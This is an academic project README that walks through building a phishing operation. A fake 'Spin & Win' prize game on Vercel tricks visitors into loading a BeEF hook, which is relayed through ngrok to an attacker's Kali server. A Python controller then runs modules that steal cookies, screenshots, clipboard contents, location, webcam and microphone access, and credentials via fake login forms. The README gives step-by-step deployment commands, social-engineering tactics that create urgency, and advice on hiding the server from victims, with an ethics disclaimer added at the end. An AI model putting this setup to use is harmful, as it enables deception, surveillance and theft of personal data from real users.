# BeEF Cloud Exploitation Platform

> **Academic Project** - Browser Exploitation Framework (BeEF) with cloud-hosted phishing infrastructure for cybersecurity research and education.

## 📋 Table of Contents

- [Project Overview](#-project-overview)
- [Architecture](#-architecture)
- [Prerequisites](#-prerequisites)
- [Installation Guide](#-installation-guide)
  - [Step 1: Install Kali Linux on Windows](#step-1-install-kali-linux-on-windows)
  - [Step 2: Install Python in Kali Linux](#step-2-install-python-in-kali-linux)
  - [Step 3: Install BeEF Framework](#step-3-install-beef-framework)
  - [Step 4: Install ngrok](#step-4-install-ngrok)
  - [Step 5: Setup Project Environment](#step-5-setup-project-environment)
  - [Step 6: Deploy to Vercel](#step-6-deploy-to-vercel)
- [Configuration](#-configuration)
- [Usage Guide](#-usage-guide)
- [File Structure & Purpose](#-file-structure--purpose)
- [Available Exploits](#-available-exploits)
- [Troubleshooting](#-troubleshooting)
- [Security & Ethics](#-security--ethics)
- [Team](#-team)

---

## 🎯 Project Overview

**BeEF Cloud Exploitation Platform** is an offensive security toolkit that demonstrates browser-based exploitation techniques using the Browser Exploitation Framework (BeEF). This project was developed for academic purposes at FAST-NUCES to understand web security vulnerabilities and browser exploitation methodologies.

### What This Project Does:

1. **Phishing Infrastructure**: Hosts a fake "Spin & Win" game on Vercel that appears legitimate to trick users
2. **Browser Hooking**: Injects BeEF hook into victim's browser to establish persistent connection
3. **Exploit Automation**: Python controller (`hijack.py`) automates execution of browser exploits
4. **Cloud Tunneling**: Uses ngrok to expose local BeEF server securely over HTTPS
5. **Data Extraction**: Captures browser information, cookies, geolocation, and other sensitive data

### Key Features:

- ✅ Automated exploit execution via CLI
- ✅ Real-time browser monitoring
- ✅ Result saving to local directory
- ✅ Professional phishing page design
- ✅ Token-based authentication with BeEF API
- ✅ Support for 12+ exploit modules

---

## 🏗️ Architecture

```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Victim    │────────▶│    Vercel    │────────▶│   ngrok     │
│   Browser   │         │  (Phishing)  │         │   Tunnel    │
└─────────────┘         └──────────────┘         └─────────────┘
                                │                        │
                                │                        │
                                ▼                        ▼
                        ┌──────────────┐         ┌─────────────┐
                        │  hook.js +   │         │    BeEF     │
                        │ beef-proxy   │         │  Framework  │
                        │  Functions   │         │  (Kali)     │
                        └──────────────┘         └─────────────┘
                                                        ▲
                                                        │
                                                        │
                                                  ┌─────────────┐
                                                  │  hijack.py  │
                                                  │ Controller  │
                                                  └─────────────┘
```

**Flow:**

1. Victim visits phishing page on Vercel (https://beef-hijack.vercel.app)
2. BeEF hook loads via `/api/hook` endpoint (proxies through Vercel to ngrok)
3. Victim's browser connects to BeEF server on Kali Linux
4. Attacker uses `hijack.py` to execute exploits remotely
5. Results saved locally for analysis

---

## 📦 Prerequisites

- Windows 10/11 with WSL2 support
- Internet connection
- GitHub account
- Vercel account (free tier)
- ngrok account (free tier)
- Basic command line knowledge

---

## 🚀 Installation Guide

### Step 1: Install Kali Linux on Windows

1. **Enable WSL2 on Windows:**

   Open PowerShell as Administrator and run:

   ```powershell
   wsl --install
   ```

   Restart your computer when prompted.

2. **Install Kali Linux from Microsoft Store:**

   - Open Microsoft Store
   - Search for "Kali Linux"
   - Click "Get" or "Install"
   - Wait for installation to complete

3. **Launch Kali Linux:**

   - Search "Kali" in Windows Start Menu
   - Click "Kali Linux"
   - Create username and password when prompted

4. **Update Kali Linux:**

   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

---

### Step 2: Install Python in Kali Linux

1. **Check if Python is installed:**

   ```bash
   python3 --version
   ```

   Kali usually comes with Python pre-installed. If not, install it:

   ```bash
   sudo apt install python3 python3-pip python3-venv -y
   ```

2. **Verify pip installation:**

   ```bash
   pip3 --version
   ```

---

### Step 3: Install BeEF Framework

1. **Install BeEF dependencies:**

   ```bash
   sudo apt install beef-xss -y
   ```

   **OR** install from source (recommended for latest version):

   ```bash
   cd ~
   sudo apt install curl git ruby ruby-dev libsqlite3-dev build-essential -y
   git clone https://github.com/beefproject/beef.git
   cd beef
   sudo gem install bundler
   bundle install
   ```

2. **Configure BeEF credentials:**

   Edit the config file:

   ```bash
   nano ~/beef/config.yaml
   ```

   Find and set:

   ```yaml
   credentials:
     user: "beef"
     passwd: "123456"
   ```

   Save and exit (Ctrl+X, Y, Enter).

3. **Test BeEF installation:**

   ```bash
   cd ~/beef
   ./beef
   ```

   You should see BeEF starting. Access it at `http://localhost:3000/ui/panel`

   - Username: `beef`
   - Password: `123456`

   Press Ctrl+C to stop BeEF for now.

---

### Step 4: Install ngrok

1. **Download ngrok:**

   ```bash
   cd ~
   wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
   ```

2. **Extract ngrok:**

   ```bash
   tar -xvzf ngrok-v3-stable-linux-amd64.tgz
   sudo mv ngrok /usr/local/bin/
   ```

3. **Create ngrok account:**

   - Visit https://ngrok.com/
   - Sign up for free account
   - Copy your authtoken from dashboard

4. **Configure ngrok:**

   ```bash
   ngrok config add-authtoken YOUR_AUTH_TOKEN_HERE
   ```

   Replace `YOUR_AUTH_TOKEN_HERE` with your actual token.

5. **Test ngrok:**

   ```bash
   ngrok http 3000
   ```

   You should see a forwarding URL like `https://abc123.ngrok-free.app`
   Press Ctrl+C to stop.

---

### Step 5: Setup Project Environment

1. **Create project directory:**

   ```bash
   mkdir -p ~/beef_hijack
   cd ~/beef_hijack
   ```

2. **Clone or create project files:**

   If you have a Git repository:

   ```bash
   git clone YOUR_REPO_URL .
   ```

   Otherwise, create files manually (see [File Structure](#-file-structure--purpose) section).

3. **Create Python virtual environment:**

   ```bash
   python3 -m venv .venv
   ```

4. **Activate virtual environment:**

   ```bash
   source .venv/bin/activate
   ```

   Your prompt should now show `(.venv)`.

5. **Install Python dependencies:**

   ```bash
   pip install requests rich
   ```

6. **Make hijack.py executable:**

   ```bash
   chmod +x hijack.py
   ```

---

### Step 6: Deploy to Vercel

1. **Install Vercel CLI (on Windows PowerShell):**

   ```powershell
   npm install -g vercel
   ```

   If you don't have Node.js, install it from https://nodejs.org/

2. **Navigate to project directory (Windows):**

   ```powershell
   cd \\wsl.localhost\kali-linux\home\kali\beef_hijack
   ```

3. **Initialize Vercel project:**

   ```powershell
   vercel
   ```

   - Select "Continue with GitHub/GitLab/Bitbucket" or "Continue with Email"
   - Link to existing project or create new one
   - Project name: `beef-hijack` (or your choice)
   - Directory: `./`
   - Override settings: **No**

4. **Deploy to production:**

   ```powershell
   vercel --prod
   ```

   Note your production URL (e.g., `https://beef-hijack.vercel.app`)

5. **Configure environment variable:**

   After deployment, you need to add the ngrok URL as an environment variable:

   ```powershell
   vercel env add BEEF_SERVER_URL
   ```

   When prompted:

   - Environment: **Production**
   - Value: Your ngrok URL (e.g., `https://abc123.ngrok-free.app`)

   **⚠️ IMPORTANT:** You must update this environment variable in Vercel **EVERY TIME** you restart ngrok, as the URL changes with the free tier.

6. **Redeploy after setting environment variable:**

   ```powershell
   vercel --prod
   ```

---

## ⚙️ Configuration

### BeEF Configuration

Edit `hijack.py` if you changed BeEF credentials:

```python
BEEF_HOST = "localhost"
BEEF_PORT = 3000
BEEF_USER = "beef"
BEEF_PASS = "123456"
```

### Vercel Environment Variables

**Every time you start ngrok, you MUST update the Vercel environment variable:**

**Method 1: Via Vercel Dashboard (Web)**

1. Go to https://vercel.com/dashboard
2. Select your project (`beef-hijack`)
3. Go to **Settings** → **Environment Variables**
4. Find `BEEF_SERVER_URL`
5. Click **Edit**
6. Update with new ngrok URL (e.g., `https://xyz789.ngrok-free.app`)
7. Click **Save**
8. Redeploy: Click **Deployments** → **⋯** → **Redeploy**

**Method 2: Via CLI**

```powershell
vercel env rm BEEF_SERVER_URL production
vercel env add BEEF_SERVER_URL production
# Enter new ngrok URL when prompted
vercel --prod
```

---

## 📖 Usage Guide

### Starting the Framework

Follow these steps **in order** every time you want to use the framework:

#### 1. Start BeEF Server (Kali Linux)

```bash
cd ~/beef
./beef
```

Keep this terminal open. BeEF should be running at `http://localhost:3000/ui/panel`

#### 2. Start ngrok Tunnel (New Kali Terminal)

Open a new terminal (Ctrl+Shift+T) and run:

```bash
ngrok http 3000
```

**Copy the HTTPS forwarding URL** (e.g., `https://abc123.ngrok-free.app`)

Keep this terminal open.

#### 3. Update Vercel Environment Variable (Windows PowerShell)

```powershell
cd \\wsl.localhost\kali-linux\home\kali\beef_hijack
vercel env rm BEEF_SERVER_URL production
vercel env add BEEF_SERVER_URL production
# Paste ngrok URL when prompted
vercel --prod
```

Wait for deployment to complete (~30 seconds).

#### 4. Activate Python Environment (New Kali Terminal)

Open another new terminal and run:

```bash
cd ~/beef_hijack
source .venv/bin/activate
```

Now you're ready to use the controller!

---

### Using hijack.py Controller

#### Check Status

```bash
python3 hijack.py --status
```

Shows:

- BeEF server status
- Your local IP
- ngrok tunnel status (if running)

#### Monitor for Hooked Browsers

```bash
python3 hijack.py --monitor
```

Continuously checks for new victim connections. Press Ctrl+C to stop.

#### List Hooked Browsers

```bash
python3 hijack.py --list
```

Displays table of all connected victims with:

- Session ID
- IP Address
- Browser name and version
- Operating system
- Hook timestamp

#### Execute Single Exploit

```bash
python3 hijack.py --exploit alert --session SESSION_ID
```

Replace `SESSION_ID` with actual session from `--list` output.

**Example:**

```bash
python3 hijack.py --exploit alert --session LFw6aU8buhMnp7R3iAESsj2OnocVgRNOepcAKf0i55rRMun9MRTkSQKx3j39qbBnvOpbEI4AkIu5xeqI
```

#### Execute All Exploits

```bash
python3 hijack.py --exploit all --session SESSION_ID
```

Runs all enabled exploit modules sequentially.

#### Save Results to Local Directory

```bash
python3 hijack.py --exploit all --session SESSION_ID --save
```

Creates a timestamped directory (`results_SESSION_TIMESTAMP/`) containing:

- `victim_info.json` - Browser fingerprint and system info
- `all_commands.json` - All executed commands and results
- `REPORT.txt` - Human-readable summary

#### Execute Custom JavaScript

```bash
python3 hijack.py --exploit raw_js --session SESSION_ID --code "alert('Hacked!');"
```

#### Redirect Browser

```bash
python3 hijack.py --exploit redirect --session SESSION_ID --url "https://example.com"
```

---

### Testing the Phishing Page

1. Open your Vercel deployment URL in a browser:

   ```
   https://beef-hijack.vercel.app
   ```

2. The "Spin & Win" game will request camera and microphone permissions.

3. After granting permissions (or clicking anywhere), the game loads and BeEF hook activates.

4. Check for hooked browser:

   ```bash
   python3 hijack.py --list
   ```

5. Execute exploits on the hooked session.

---

## 📁 File Structure & Purpose

```
beef_hijack/
│
├── hijack.py              # Main Python controller script
├── index.html             # Phishing page (Spin & Win game)
├── README.md              # This documentation file
├── issues.txt             # Known issues and notes (optional)
│
├── api/                   # Vercel serverless functions
│   ├── hook.js            # Proxies BeEF hook.js from ngrok to victim
│   ├── beef-proxy.js      # Proxies BeEF API requests
│   └── config.js          # Returns ngrok URL to frontend
│
└── .venv/                 # Python virtual environment (created during setup)
```

---

### File Purposes Explained

#### `hijack.py` - Main Controller Script

**Purpose:** Command-line interface for BeEF automation

**What it does:**

- Checks if BeEF server is running
- Authenticates with BeEF API using token-based auth
- Lists all hooked (compromised) browsers
- Executes exploit modules on victim browsers
- Saves exploit results to local files
- Provides real-time monitoring of new victims

**Key functions:**

- `get_beef_token()` - Authenticates and retrieves API token
- `get_hooked_browsers()` - Fetches list of active victims
- `run_exploit()` - Executes a specific exploit module
- `run_all_exploits()` - Runs all enabled exploits sequentially
- `save_exploit_results()` - Exports data to JSON/text files

**CLI Arguments:**

- `--status` - Check BeEF and system status
- `--monitor` - Watch for new hooked browsers
- `--list` - Display all connected victims
- `--exploit [name|all]` - Execute exploit(s)
- `--session SESSION_ID` - Target specific victim
- `--save` - Export results to files
- `--code CODE` - Custom JavaScript for raw_js exploit
- `--url URL` - Target URL for redirect exploit

---

#### `index.html` - Phishing Page

**Purpose:** Fake "Spin & Win" game to hook victims

**What it does:**

- Displays professional-looking prize wheel game
- Requests camera and microphone permissions (required for some exploits)
- Loads BeEF hook.js in the background without victim knowing
- Maintains connection even after page navigation

**Key features:**

- Gradient background with responsive design
- 6-segment spinning wheel with prizes (iPhone, Cash, AirPods, etc.)
- Permission request flow before showing game
- BeEF hook loads via `/api/hook` endpoint (Vercel proxy)
- Spin animation and confetti effects

**Social engineering tactics:**

- "Only 3 spins left today!" creates urgency
- Legitimate-looking prizes increase credibility
- Permission request appears as normal browser feature
- Professional design reduces suspicion

---

#### `api/hook.js` - BeEF Hook Proxy

**Purpose:** Vercel serverless function that proxies BeEF's hook.js

**What it does:**

- Fetches `hook.js` from BeEF server via ngrok URL
- Modifies script to fix any path issues
- Serves it to victim's browser with correct CORS headers
- Hides actual BeEF server location from victim

**Why needed:**

- Vercel frontend can't directly access Kali server
- ngrok provides HTTPS tunnel for secure connection
- CORS restrictions require proxy for cross-origin requests
- Victim sees only Vercel domain, not internal infrastructure

---

#### `api/beef-proxy.js` - BeEF API Proxy

**Purpose:** Proxies all BeEF API requests from frontend to backend

**What it does:**

- Forwards API calls from victim browser to BeEF server
- Handles authentication and headers
- Maintains persistent connection for command execution
- Returns responses back to victim browser

**Endpoints proxied:**

- `/api/hooks` - Hook registration and updates
- `/api/modules` - Available exploit modules
- Command execution endpoints

---

#### `api/config.js` - Configuration Provider

**Purpose:** Returns ngrok URL to frontend

**What it does:**

- Reads `BEEF_SERVER_URL` environment variable from Vercel
- Provides it to `index.html` so BeEF hook knows where to connect
- Updates dynamically when environment variable changes

**Environment variable:**

```
BEEF_SERVER_URL = https://your-ngrok-url.ngrok-free.app
```

**⚠️ Critical:** This must be updated every time ngrok restarts!

---

## 🎯 Available Exploits

| Exploit Name        | Module ID | Description                               | Status     |
| ------------------- | --------- | ----------------------------------------- | ---------- |
| `alert`             | 285       | Shows alert dialog with custom message    | ✅ Working |
| `redirect`          | 260       | Redirects browser to specified URL        | ⚠️ Testing |
| `geolocation`       | 104       | Retrieves GPS coordinates via browser API | ⚠️ Testing |
| `cookies`           | 277       | Steals all cookies from current domain    | ⚠️ Testing |
| `screenshot`        | 246       | Captures screenshot of victim's browser   | ⚠️ Testing |
| `fingerprint`       | 289       | Collects detailed browser fingerprint     | ⚠️ Testing |
| `history`           | 288       | Retrieves browsing history                | ⚠️ Testing |
| `webcam`            | 252       | Attempts to access webcam (HTML5 API)     | ⚠️ Testing |
| `clipboard`         | 127       | Reads clipboard contents                  | ⚠️ Testing |
| `record_audio`      | 26        | Starts audio recording via microphone     | ⚠️ Testing |
| `pretty_theft`      | 8         | Fake login form for credential phishing   | ⚠️ Testing |
| `fake_notification` | 17        | Shows fake browser notification bar       | ⚠️ Testing |
| `raw_js`            | 80        | Executes custom JavaScript code           | ⚠️ Testing |

**Note:** Some exploits may not work due to browser security policies, permissions, or BeEF version compatibility. The project is currently in testing phase to identify reliably working modules.

---

## 🔧 Troubleshooting

### Common Issues

#### 1. BeEF Won't Start

**Error:** `Address already in use` or `Port 3000 is busy`

**Solution:**

```bash
# Find process using port 3000
sudo lsof -i :3000
# Kill the process
sudo kill -9 PID_NUMBER
# Or use killall
sudo killall beef
```

---

#### 2. ngrok URL Changes Every Time

**Problem:** Free ngrok tier generates new URL on each restart

**Solution:**

- This is expected behavior with free tier
- **Always update Vercel environment variable** after restarting ngrok
- Consider ngrok paid plan for static URL
- Create a script to automate Vercel update:

```bash
# save as update_vercel.sh
#!/bin/bash
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[^"]*\.ngrok-free\.app' | head -1)
echo "Detected ngrok URL: $NGROK_URL"
vercel env rm BEEF_SERVER_URL production --yes
echo $NGROK_URL | vercel env add BEEF_SERVER_URL production
vercel --prod
```

---

#### 3. "No Hooked Browsers Found"

**Possible causes:**

1. **Victim didn't visit page:** Share Vercel URL with target
2. **BeEF hook failed to load:** Check browser console (F12) for errors
3. **Vercel environment variable wrong:** Verify `BEEF_SERVER_URL` matches ngrok URL
4. **ngrok tunnel closed:** Check if ngrok is still running
5. **CORS errors:** Redeploy Vercel after changing environment variable

**Debug steps:**

```bash
# Check BeEF logs
cd ~/beef
tail -f logs/beef.log

# Check ngrok status
curl http://localhost:4040/api/tunnels

# Test Vercel proxy
curl https://beef-hijack.vercel.app/api/config
```

---

#### 4. Exploits Report Success But Don't Work

**Known issue:** Some BeEF modules show "Success" but don't execute

**Causes:**

- Browser security policies block actions
- Permissions not granted (camera, microphone, clipboard)
- Module incompatibility with victim browser
- Timing issues (command queued but not executed)

**Solution:**

- Test exploits one by one to find working ones
- Check BeEF UI (`http://localhost:3000/ui/panel`) for actual results
- Some exploits work only on specific browsers/OS
- Use `--save` flag to verify results in output files

---

#### 5. Python Dependencies Missing

**Error:** `ModuleNotFoundError: No module named 'requests'` or `'rich'`

**Solution:**

```bash
# Activate virtual environment first
source .venv/bin/activate

# Install dependencies
pip install requests rich

# Verify installation
pip list | grep -E 'requests|rich'
```

---

#### 6. Permission Denied on hijack.py

**Error:** `bash: ./hijack.py: Permission denied`

**Solution:**

```bash
chmod +x hijack.py
# Or run with python3 explicitly
python3 hijack.py --status
```

---

#### 7. Vercel Deployment Fails

**Error:** `Error: No framework detected`

**Solution:**

- Ensure you're in correct directory: `\\wsl.localhost\kali-linux\home\kali\beef_hijack`
- Check `api/` folder exists with .js files
- Try manual framework selection:
  ```powershell
  vercel --prod --yes
  ```

---

#### 8. WSL Can't Connect to Internet

**Solution:**

```powershell
# In Windows PowerShell (as Admin)
wsl --shutdown
# Restart Kali Linux from Start Menu
```

---

## 🔐 Security & Ethics

### ⚠️ LEGAL DISCLAIMER

This project is intended **SOLELY for educational and research purposes** as part of an academic curriculum at FAST-NUCES.

**Unauthorized use of this framework against systems you don't own or have explicit permission to test is ILLEGAL and may result in:**

- Criminal charges under Computer Fraud and Abuse Act (CFAA)
- Civil lawsuits
- Academic expulsion
- Permanent criminal record

### Ethical Usage Guidelines

✅ **DO:**

- Use only in controlled lab environments
- Test on your own devices/accounts
- Obtain written permission before testing
- Document findings for educational purposes
- Report vulnerabilities responsibly
- Follow your institution's acceptable use policies

❌ **DON'T:**

- Deploy phishing pages targeting real users
- Use on public networks without authorization
- Steal credentials or personal data
- Distribute malware or harmful code
- Share access to compromised systems
- Violate privacy laws (GDPR, CCPA, etc.)

### Best Practices

1. **Always disclose**: If demonstrating to others, inform them beforehand
2. **Isolated testing**: Use virtual machines or test devices
3. **Data protection**: Delete captured data after analysis
4. **Responsible disclosure**: Report vulnerabilities to vendors
5. **Academic integrity**: Follow university ethics board guidelines

---

## 👥 Team

**Project:** BeEF Cloud Exploitation Platform  
**Institution:** FAST-NUCES (National University of Computer and Emerging Sciences)  
**Course:** Cybersecurity / Offensive Security  
**Purpose:** Academic bonus marks project

**Team Members:**

- **Bilal Ahmad** - Roll No: 22L-7472
- **Shahzad Waris** - Roll No: 22L-7530
- **Umair Imran** - Roll No: 22L-8370

---

## 📚 Additional Resources

### BeEF Documentation

- Official Wiki: https://github.com/beefproject/beef/wiki
- Module Reference: https://github.com/beefproject/beef/wiki/Module-Development

### ngrok Documentation

- Getting Started: https://ngrok.com/docs/getting-started
- Agents API: https://ngrok.com/docs/agent

### Vercel Documentation

- Serverless Functions: https://vercel.com/docs/functions
- Environment Variables: https://vercel.com/docs/environment-variables

### Further Learning

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- Browser Security Handbook: https://code.google.com/archive/p/browsersec/

---

## 📝 Changelog

### Version 1.0 (Current)

- Initial release with basic BeEF integration
- Token-based authentication
- 13 exploit modules
- Result saving functionality
- Professional phishing page design
- Complete documentation

---

## 🤝 Contributing

This is an academic project and not actively maintained for public contributions. However, if you're a student working on similar projects:

1. Fork this repository
2. Create feature branch (`git checkout -b feature/improvement`)
3. Document your changes thoroughly
4. Submit pull request with detailed explanation

---

## 📄 License

This project is provided for **educational purposes only** under academic fair use.

**No warranty is provided.** The authors are not responsible for any misuse or damage caused by this software.

---

## 📞 Support

For questions or issues related to this project:

1. Check [Troubleshooting](#-troubleshooting) section first
2. Review BeEF documentation for module-specific issues
3. Contact project team members via university email
4. Consult course instructor for academic guidance

---

**Last Updated:** November 2025  
**Version:** 1.0  
**Status:** Active Development / Testing Phase

---
